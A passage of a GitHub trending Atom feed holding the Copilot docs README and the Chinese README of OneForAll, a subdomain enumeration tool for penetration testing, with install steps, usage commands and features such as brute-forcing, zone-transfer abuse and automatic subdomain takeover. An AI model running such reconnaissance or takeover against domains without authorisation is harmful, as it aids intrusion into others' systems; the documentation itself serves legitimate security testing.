国际&lt;/a&gt; 进行许可。&lt;a href=&#34;mailto:595666367@qq.com&#34;&gt;联系我&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>github/copilot-docs</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/github/copilot-docs</id>
    <link href="https://github.com/github/copilot-docs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Documentation for GitHub Copilot&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;GitHub Copilot &lt;img src=&#34;https://img.shields.io/badge/version-technical_preview-green&#34; alt=&#34;Version&#34;&gt;&lt;/h1&gt; &#xA;&lt;img width=&#34;128&#34; alt=&#34;GitHub Copilot Logo&#34; src=&#34;https://user-images.githubusercontent.com/28068/123712981-02676c80-d839-11eb-919a-96ee0c895e15.png&#34;&gt; &#xA;&lt;p&gt;Welcome to the GitHub Copilot user community! In this repository, you can find documentation, walkthroughs, examples, and the latest resources you need to use GitHub Copilot.&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;To install GitHub Copilot, check out the Getting Started guides:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/github/copilot-docs/main/docs/visualstudiocode/gettingstarted.md#getting-started-with-github-copilot-in-visual-studio-code&#34;&gt;Visual Studio Code&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/github/copilot-docs/main/docs/visualstudio/gettingstarted.md#getting-started-with-github-copilot-in-visual-studio&#34;&gt;Visual Studio&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/github/copilot-docs/main/docs/jetbrains/gettingstarted.md#getting-started-with-github-copilot-in-jetbrains&#34;&gt;JetBrains&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/github/copilot.vim#getting-started&#34;&gt;Neovim&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For a tour of GitHub Copilot, visit the homepage at &lt;a href=&#34;https://copilot.github.com&#34;&gt;copilot.github.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;How to get help&lt;/h2&gt; &#xA;&lt;p&gt;Have a question, or want to provide feedback? Visit the &lt;a href=&#34;https://github.com/github/feedback/discussions/categories/copilot-feedback&#34;&gt;Feedback forum&lt;/a&gt; to ask questions, share bugs or feedback, or chat with other users in the Preview. The GitHub Copilot team will respond as often as possible, but we also welcome you to share your experiences and help others in the community.&lt;/p&gt; &#xA;&lt;h2&gt;Safety&lt;/h2&gt; &#xA;&lt;p&gt;We take safety seriously and are constantly working to improve GitHub Copilot. If you discover dangerous, biased, or offensive output from GitHub Copilot, please report it privately to &lt;a href=&#34;mailto:copilot-safety@github.com&#34;&gt;copilot-safety@github.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Useful links&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://copilot.github.com&#34;&gt;GitHub Copilot homepage&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/github/copilot-docs/main/gallery&#34;&gt;Gallery&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/github/copilot-docs/main/docs&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/github/feedback/discussions/categories/copilot-feedback&#34;&gt;Feedback forum&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Code of conduct&lt;/h2&gt; &#xA;&lt;p&gt;All users of GitHub Copilot are expected to comply with our &lt;a href=&#34;https://raw.githubusercontent.com/github/copilot-docs/main/CODE_OF_CONDUCT.md&#34;&gt;Code of Conduct&lt;/a&gt;. By participating in this repository, you are also agreeing to the same &lt;a href=&#34;https://help.github.com/articles/github-terms-of-service/&#34;&gt;Terms of Service&lt;/a&gt; that you agree to when using GitHub.com.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Content in this repository is released under &lt;a href=&#34;https://raw.githubusercontent.com/github/copilot-docs/main/LICENSE.txt&#34;&gt;CC-BY-4.0&lt;/a&gt;. When using the GitHub logos, be sure to follow the &lt;a href=&#34;https://github.com/logos&#34;&gt;GitHub logo guidelines&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>shmilylty/OneForAll</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/shmilylty/OneForAll</id>
    <link href="https://github.com/shmilylty/OneForAll" rel="alternate"></link>
    <summary type="html">&lt;p&gt;OneForAll是一款功能强大的子域收集工具&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;OneForAll&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://travis-ci.org/shmilylty/OneForAll&#34;&gt;&lt;img src=&#34;https://travis-ci.org/shmilylty/OneForAll.svg?branch=master&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/gh/shmilylty/OneForAll&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/shmilylty/OneForAll/branch/master/graph/badge.svg?sanitize=true&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codeclimate.com/github/shmilylty/OneForAll/maintainability&#34;&gt;&lt;img src=&#34;https://api.codeclimate.com/v1/badges/1287668a6b4c72af683e/maintainability&#34; alt=&#34;Maintainability&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/shmilylty/OneForAll&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/python-3.6%7C3.7%7C3.8-blue&#34; alt=&#34;python&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/shmilylty/OneForAll/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/release-v0.4.3-brightgreen&#34; alt=&#34;python&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;👊&lt;strong&gt;OneForAll是一款功能强大的子域收集工具&lt;/strong&gt; 📝&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/en-us/README.md&#34;&gt;English Document&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/shmilylty/OneForAll/master/docs/usage_example.svg?sanitize=true&#34; alt=&#34;Example&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;🚀上手指南&lt;/h2&gt; &#xA;&lt;p&gt;📢 请务必花一点时间阅读此文档，有助于你快速熟悉OneForAll！&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;b&gt;🐍安装要求&lt;/b&gt;&lt;/summary&gt; &#xA; &lt;p&gt;OneForAll基于&lt;a href=&#34;https://www.python.org/downloads/release/python-360/&#34;&gt;Python 3.6.0&lt;/a&gt;开发和测试，OneForAll需要高于Python 3.6.0的版本才能运行。 安装Python环境可以参考&lt;a href=&#34;https://pythonguidecn.readthedocs.io/zh/latest/starting/installation.html#python-3&#34;&gt;Python 3 安装指南&lt;/a&gt;。运行以下命令检查Python和pip3版本：&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python -V&#xA;pip3 -V&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;如果你看到类似以下的输出便说明Python环境没有问题：&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Python 3.6.0&#xA;pip 19.2.2 from C:\Users\shmilylty\AppData\Roaming\Python\Python36\site-packages\pip (python 3.6)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;b&gt;✔安装步骤（git 版）&lt;/b&gt;&lt;/summary&gt; &#xA; &lt;ol&gt; &#xA;  &lt;li&gt;&lt;strong&gt;下载&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;/ol&gt; &#xA; &lt;p&gt;由于该项目&lt;strong&gt;处于开发中&lt;/strong&gt;，会不断进行更新迭代，下载时请使用&lt;code&gt;git clone&lt;/code&gt;&lt;strong&gt;克隆&lt;/strong&gt;最新代码仓库，也方便后续的更新，不推荐从Releases下载，因为Releases里版本更新缓慢，也不方便更新， 本项目已经在&lt;a href=&#34;https://gitee.com/shmilylty/OneForAll.git&#34;&gt;码云&lt;/a&gt;(Gitee)镜像了一份，国内推荐使用码云进行克隆比较快：&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://gitee.com/shmilylty/OneForAll.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;或者：&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/shmilylty/OneForAll.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;ol start=&#34;2&#34;&gt; &#xA;  &lt;li&gt;&lt;strong&gt;安装&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;/ol&gt; &#xA; &lt;p&gt;你可以通过pip3安装OneForAll的依赖，以下为&lt;strong&gt;Windows系统&lt;/strong&gt;下使用&lt;strong&gt;pip3&lt;/strong&gt;安装依赖的示例：注意：如果你的Python3安装在系统Program Files目录下，如：&lt;code&gt;C:\Program Files\Python36&lt;/code&gt;，那么请以管理员身份运行命令提示符cmd执行以下命令！&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd OneForAll/&#xA;python3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/&#xA;pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/&#xA;python3 oneforall.py --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;其他系统平台的请参考&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/installation_dependency.md&#34;&gt;依赖安装&lt;/a&gt;，如果在安装依赖过程中发现编译某个依赖库失败时可以参考&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/troubleshooting.md&#34;&gt;常见问题与回答.md&lt;/a&gt;文档中解决方法，如果依然不能解决欢迎加群反馈问题。&lt;/p&gt; &#xA; &lt;ol start=&#34;3&#34;&gt; &#xA;  &lt;li&gt;&lt;strong&gt;更新&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;/ol&gt; &#xA; &lt;p&gt;执行以下命令&lt;strong&gt;更新&lt;/strong&gt;项目（可保存对&lt;code&gt;/config/setting.py&lt;/code&gt;和&lt;code&gt;/config/api.py&lt;/code&gt;的修改）：&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git stash        # 暂存本地的修改&#xA;git fetch --all  # 拉取项目更新&#xA;git pull         # 下载覆盖&#xA;git stash pop    # 释放本地修改&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;b&gt;✔安装步骤（docker 版）&lt;/b&gt;&lt;/summary&gt; &#xA; &lt;p&gt;首先下载并编辑配置文件，添加自己的&lt;code&gt;api&lt;/code&gt;和个性化设置，并保留原始文件结构&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;config&#xA;├── api.py&#xA;├── log.py&#xA;└── setting.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;拉取镜像并执行，其中&lt;code&gt;~/.config&lt;/code&gt;替换为你自己配置文件所在文件夹的路径&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;docker pull shmilylty/oneforall&#xA;docker run -it --rm -v ~/results:/OneForAll/results -v ~/.config:/OneForAll/config shmilylty/oneforall --target example.com run&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;参数直接加在指令末尾，结果会输出在本地目录&lt;code&gt;~/results&lt;/code&gt;，如需保存到其他位置，可以自行修改&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;b&gt;✨使用演示&lt;/b&gt;&lt;/summary&gt; &#xA; &lt;p&gt;如果你是通过pip3安装的依赖则使用以下命令运行示例：&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python3 oneforall.py --target example.com run&#xA;python3 oneforall.py --targets ./example.txt run&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/shmilylty/OneForAll/master/docs/usage_example.svg?sanitize=true&#34; alt=&#34;Example&#34;&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;b&gt;🧐结果说明&lt;/b&gt;&lt;/summary&gt; &#xA; &lt;p&gt;我们以&lt;code&gt;python3 oneforall.py --target example.com run&lt;/code&gt;命令为例，OneForAll在默认参数正常执行完毕会在results目录生成相应结果：&lt;/p&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/shmilylty/OneForAll/master/images/Result.png&#34; alt=&#34;Result&#34;&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;example.com.csv&lt;/code&gt;是每个主域下的子域收集结果。&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;all_subdomain_result_1583034493.csv&lt;/code&gt;是每次运行OneForAll收集到子域的汇总结果，包含&lt;code&gt;example.com.csv&lt;/code&gt;，方便在批量收集场景中获取全部结果。&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;result.sqlite3&lt;/code&gt;是存放每次运行OneForAll收集到子域的SQLite3结果数据库，其数据库结构如下图：&lt;/p&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/shmilylty/OneForAll/master/images/Database.png&#34; alt=&#34;Database&#34;&gt;&lt;/p&gt; &#xA; &lt;p&gt;其中类似&lt;code&gt;example_com_origin_result&lt;/code&gt;表存放每个模块最初子域收集结果。&lt;/p&gt; &#xA; &lt;p&gt;其中类似&lt;code&gt;example_com_resolve_result&lt;/code&gt;表存放对子域进行解析后的结果。&lt;/p&gt; &#xA; &lt;p&gt;其中类似&lt;code&gt;example_com_last_result&lt;/code&gt;表存放上一次子域收集结果（需要收集两次以上才会生成）。&lt;/p&gt; &#xA; &lt;p&gt;其中类似&lt;code&gt;example_com_now_result&lt;/code&gt;表存放现在子域收集结果，一般情况关注这张表就可以了。&lt;/p&gt; &#xA; &lt;p&gt;更多信息请参阅&lt;a href=&#34;https://raw.githubusercontent.com/shmilylty/OneForAll/master/docs/field.md&#34;&gt;字段解释说明&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;b&gt;🤔使用帮助&lt;/b&gt;&lt;/summary&gt; &#xA; &lt;p&gt;命令行参数只提供了一些常用参数，更多详细的参数配置请见&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/config/setting.py&#34;&gt;setting.py&lt;/a&gt;，如果你认为有些参数是命令界面经常使用到的或缺少了什么参数等问题非常欢迎反馈。由于众所周知的原因，如果要使用一些被墙的收集接口请先到&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/config/setting.py&#34;&gt;setting.py&lt;/a&gt;配置代理，有些收集模块需要提供API（大多都是可以注册账号免费获取），如果需要使用请到&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/config/api.py&#34;&gt;api.py&lt;/a&gt;配置API信息，如果不使用请忽略有关报错提示。（详细模块请阅读&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/collection_modules.md&#34;&gt;收集模块说明&lt;/a&gt;）&lt;/p&gt; &#xA; &lt;p&gt;OneForAll命令行界面基于&lt;a href=&#34;https://github.com/google/python-fire/&#34;&gt;Fire&lt;/a&gt;实现，有关Fire更高级使用方法请参阅&lt;a href=&#34;https://github.com/google/python-fire/raw/master/docs/using-cli.md&#34;&gt;使用Fire CLI&lt;/a&gt;。&lt;/p&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/oneforall.py&#34;&gt;oneforall.py&lt;/a&gt;是主程序入口，oneforall.py可以调用&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/brute.py&#34;&gt;brute.py&lt;/a&gt;，&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/takerover.py&#34;&gt;takerover.py&lt;/a&gt;及&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/dbexport.py&#34;&gt;dbexport.py&lt;/a&gt;等模块，为了方便进行子域爆破独立出了brute.py，为了方便进行子域接管风险检查独立出了takerover.py，为了方便数据库导出独立出了dbexport.py，这些模块都可以单独运行，并且所接受参数要更丰富一点，如果要单独使用这些模块请参考&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/usage_help.md&#34;&gt;使用帮助&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;❗注意：当你在使用过程中遇到一些问题或者疑惑时，请先到&lt;a href=&#34;https://github.com/shmilylty/OneForAll/issues&#34;&gt;Issues&lt;/a&gt;里使用搜索找找答案，还可以参阅&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/troubleshooting.md&#34;&gt;常见问题与回答&lt;/a&gt;。&lt;/p&gt; &#xA; &lt;p&gt;&lt;strong&gt;oneforall.py使用帮助&lt;/strong&gt;&lt;/p&gt; &#xA; &lt;p&gt;以下帮助信息可能不是最新的，你可以使用&lt;code&gt;python oneforall.py --help&lt;/code&gt;获取最新的帮助信息。&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python oneforall.py --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;NAME&#xA;    oneforall.py - OneForAll帮助信息&#xA;&#xA;SYNOPSIS&#xA;    oneforall.py COMMAND | --target=TARGET &amp;lt;flags&amp;gt;&#xA;&#xA;DESCRIPTION&#xA;    OneForAll是一款功能强大的子域收集工具&#xA;&#xA;    Example:&#xA;        python3 oneforall.py version&#xA;        python3 oneforall.py --target example.com run&#xA;        python3 oneforall.py --targets ./domains.txt run&#xA;        python3 oneforall.py --target example.com --valid None run&#xA;        python3 oneforall.py --target example.com --brute True run&#xA;        python3 oneforall.py --target example.com --port small run&#xA;        python3 oneforall.py --target example.com --fmt csv run&#xA;        python3 oneforall.py --target example.com --dns False run&#xA;        python3 oneforall.py --target example.com --req False run&#xA;        python3 oneforall.py --target example.com --takeover False run&#xA;        python3 oneforall.py --target example.com --show True run&#xA;&#xA;    Note:&#xA;        参数alive可选值True，False分别表示导出存活，全部子域结果&#xA;        参数port可选值有&#39;default&#39;, &#39;small&#39;, &#39;large&#39;, 详见config.py配置&#xA;        参数fmt可选格式有 &#39;csv&#39;,&#39;json&#39;&#xA;        参数path默认None使用OneForAll结果目录生成路径&#xA;&#xA;ARGUMENTS&#xA;    TARGET&#xA;        单个域名(二选一必需参数)&#xA;    TARGETS&#xA;        每行一个域名的文件路径(二选一必需参数)&#xA;&#xA;FLAGS&#xA;    --brute=BRUTE&#xA;        s&#xA;    --dns=DNS&#xA;        DNS解析子域(默认True)&#xA;    --req=REQ&#xA;        HTTP请求子域(默认True)&#xA;    --port=PORT&#xA;        请求验证子域的端口范围(默认只探测80端口)&#xA;    --valid=VALID&#xA;        只导出存活的子域结果(默认False)&#xA;    --fmt=FMT&#xA;        结果保存格式(默认csv)&#xA;    --path=PATH&#xA;        结果保存路径(默认None)&#xA;    --takeover=TAKEOVER&#xA;        检查子域接管(默认False)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;🎉项目简介&lt;/h2&gt; &#xA;&lt;p&gt;项目地址：&lt;a href=&#34;https://github.com/shmilylty/OneForAll&#34;&gt;https://github.com/shmilylty/OneForAll&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;在渗透测试中信息收集的重要性不言而喻，子域收集是信息收集中必不可少且非常重要的一环，目前网上也开源了许多子域收集的工具，但是总是存在以下部分问题：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;不够强大&lt;/strong&gt;，子域收集的接口不够多，不能做到对批量子域自动收集，没有自动子域解析，验证，FUZZ以及信息拓展等功能。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;不够友好&lt;/strong&gt;，固然命令行模块比较方便，但是当可选的参数很多，要实现的操作复杂，用命令行模式就有点不够友好，如果有交互良好，高可操作的前端那么使用体验就会好很多。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;缺少维护&lt;/strong&gt;，很多工具几年没有更新过一次，issues和PR是啥，不存在的。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;效率问题&lt;/strong&gt;，没有利用多进程，多线程以及异步协程技术，速度较慢。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;为了解决以上痛点，此项目应用而生，正如其名，我希望OneForAll是一款集百家之长，功能强大的全面快速子域收集终极神器🔨。&lt;/p&gt; &#xA;&lt;p&gt;目前OneForAll还在开发中，肯定有不少问题和需要改进的地方，欢迎大佬们提交&lt;a href=&#34;https://github.com/shmilylty/OneForAll/issues&#34;&gt;Issues&lt;/a&gt;和&lt;a href=&#34;https://github.com/shmilylty/OneForAll/pulls&#34;&gt;PR&lt;/a&gt;，用着还行给个小星星✨吧，目前有一个专门用于OneForAll交流和反馈QQ群👨‍👨‍👦‍👦：:&lt;a href=&#34;https://raw.githubusercontent.com/shang.qq.com/wpa/qunwpa?idkey=125d3689b60445cdbb11e4ddff38036b7f6f2abbf4f7957df5dddba81aa90771&#34;&gt;&lt;strong&gt;824414244&lt;/strong&gt;&lt;/a&gt;（加群验证：信息收集）。&lt;/p&gt; &#xA;&lt;h2&gt;👍功能特性&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;收集能力强大&lt;/strong&gt;，详细模块请阅读&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/collection_modules.md&#34;&gt;收集模块说明&lt;/a&gt;。 &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;利用证书透明度收集子域（目前有6个模块：&lt;code&gt;censys_api&lt;/code&gt;，&lt;code&gt;certspotter&lt;/code&gt;，&lt;code&gt;crtsh&lt;/code&gt;，&lt;code&gt;entrust&lt;/code&gt;，&lt;code&gt;google&lt;/code&gt;，&lt;code&gt;spyse_api&lt;/code&gt;）&lt;/li&gt; &#xA;   &lt;li&gt;常规检查收集子域（目前有4个模块：域传送漏洞利用&lt;code&gt;axfr&lt;/code&gt;，检查跨域策略文件&lt;code&gt;cdx&lt;/code&gt;，检查HTTPS证书&lt;code&gt;cert&lt;/code&gt;，检查内容安全策略&lt;code&gt;csp&lt;/code&gt;，检查robots文件&lt;code&gt;robots&lt;/code&gt;，检查sitemap文件&lt;code&gt;sitemap&lt;/code&gt;，利用NSEC记录遍历DNS域&lt;code&gt;dnssec&lt;/code&gt;，后续会添加NSEC3记录等模块）&lt;/li&gt; &#xA;   &lt;li&gt;利用网上爬虫档案收集子域（目前有2个模块：&lt;code&gt;archivecrawl&lt;/code&gt;，&lt;code&gt;commoncrawl&lt;/code&gt;，此模块还在调试，该模块还有待添加和完善）&lt;/li&gt; &#xA;   &lt;li&gt;利用DNS数据集收集子域（目前有24个模块：&lt;code&gt;binaryedge_api&lt;/code&gt;, &lt;code&gt;bufferover&lt;/code&gt;, &lt;code&gt;cebaidu&lt;/code&gt;, &lt;code&gt;chinaz&lt;/code&gt;, &lt;code&gt;chinaz_api&lt;/code&gt;, &lt;code&gt;circl_api&lt;/code&gt;, &lt;code&gt;cloudflare&lt;/code&gt;, &lt;code&gt;dnsdb_api&lt;/code&gt;, &lt;code&gt;dnsdumpster&lt;/code&gt;, &lt;code&gt;hackertarget&lt;/code&gt;, &lt;code&gt;ip138&lt;/code&gt;, &lt;code&gt;ipv4info_api&lt;/code&gt;, &lt;code&gt;netcraft&lt;/code&gt;, &lt;code&gt;passivedns_api&lt;/code&gt;, &lt;code&gt;ptrarchive&lt;/code&gt;, &lt;code&gt;qianxun&lt;/code&gt;, &lt;code&gt;rapiddns&lt;/code&gt;, &lt;code&gt;riddler&lt;/code&gt;, &lt;code&gt;robtex&lt;/code&gt;, &lt;code&gt;securitytrails_api&lt;/code&gt;, &lt;code&gt;sitedossier&lt;/code&gt;, &lt;code&gt;threatcrowd&lt;/code&gt;, &lt;code&gt;wzpc&lt;/code&gt;, &lt;code&gt;ximcx&lt;/code&gt;）&lt;/li&gt; &#xA;   &lt;li&gt;利用DNS查询收集子域（目前有5个模块：通过枚举常见的SRV记录并做查询来收集子域&lt;code&gt;srv&lt;/code&gt;，以及通过查询域名的DNS记录中的MX,NS,SOA,TXT记录来收集子域）&lt;/li&gt; &#xA;   &lt;li&gt;利用威胁情报平台数据收集子域（目前有6个模块：&lt;code&gt;alienvault&lt;/code&gt;, &lt;code&gt;riskiq_api&lt;/code&gt;，&lt;code&gt;threatbook_api&lt;/code&gt;，&lt;code&gt;threatminer&lt;/code&gt;，&lt;code&gt;virustotal&lt;/code&gt;，&lt;code&gt;virustotal_api&lt;/code&gt;该模块还有待添加和完善）&lt;/li&gt; &#xA;   &lt;li&gt;利用搜索引擎发现子域（目前有18个模块：&lt;code&gt;ask&lt;/code&gt;, &lt;code&gt;baidu&lt;/code&gt;, &lt;code&gt;bing&lt;/code&gt;, &lt;code&gt;bing_api&lt;/code&gt;, &lt;code&gt;duckduckgo&lt;/code&gt;, &lt;code&gt;exalead&lt;/code&gt;, &lt;code&gt;fofa_api&lt;/code&gt;, &lt;code&gt;gitee&lt;/code&gt;, &lt;code&gt;github&lt;/code&gt;, &lt;code&gt;github_api&lt;/code&gt;, &lt;code&gt;google&lt;/code&gt;, &lt;code&gt;google_api&lt;/code&gt;, &lt;code&gt;shodan_api&lt;/code&gt;, &lt;code&gt;so&lt;/code&gt;, &lt;code&gt;sogou&lt;/code&gt;, &lt;code&gt;yahoo&lt;/code&gt;, &lt;code&gt;yandex&lt;/code&gt;, &lt;code&gt;zoomeye_api&lt;/code&gt;），在搜索模块中除特殊搜索引擎，通用的搜索引擎都支持自动排除搜索，全量搜索，递归搜索。&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;支持子域爆破&lt;/strong&gt;，该模块有常规的字典爆破，也有自定义的fuzz模式，支持批量爆破和递归爆破，自动判断泛解析并处理。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;支持子域验证&lt;/strong&gt;，默认开启子域验证，自动解析子域DNS，自动请求子域获取title和banner，并综合判断子域存活情况。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;支持子域爬取&lt;/strong&gt;，根据已有的子域，请求子域响应体以及响应体里的JS，从中再次发现新的子域。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;支持子域置换&lt;/strong&gt;，根据已有的子域，使用子域替换技术再次发现新的子域。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;支持子域接管&lt;/strong&gt;，默认开启子域接管风险检查，支持子域自动接管（目前只有Github，有待完善），支持批量检查。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;处理功能强大&lt;/strong&gt;，发现的子域结果支持自动去除，自动DNS解析，HTTP请求探测，自动筛选出有效子域，拓展子域的Banner信息，最终支持的导出格式有&lt;code&gt;txt&lt;/code&gt;, &lt;code&gt;csv&lt;/code&gt;, &lt;code&gt;json&lt;/code&gt;。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;速度极快&lt;/strong&gt;，&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/collect.py&#34;&gt;收集模块&lt;/a&gt;使用多线程调用，&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/brute.py&#34;&gt;爆破模块&lt;/a&gt;使用&lt;a href=&#34;https://github.com/blechschmidt/massdns&#34;&gt;massdns&lt;/a&gt;，DNS解析速度每秒可解析350000以上个域名，子域验证中DNS解析和HTTP请求使用异步多协程，多线程检查&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/takeover.py&#34;&gt;子域接管&lt;/a&gt;风险。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;体验良好&lt;/strong&gt;，各模块都有进度条，异步保存各模块结果。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;如果你有其他很棒的想法请务必告诉我！😎&lt;/p&gt; &#xA;&lt;h2&gt;🌲目录结构&lt;/h2&gt; &#xA;&lt;p&gt;更多信息请参阅&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/directory_structure.md&#34;&gt;目录结构说明&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;p&gt;本项目&lt;a 